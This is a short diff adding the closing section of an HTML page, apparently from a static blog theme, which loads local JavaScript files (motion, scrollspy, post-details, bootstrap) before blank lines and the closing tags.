+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
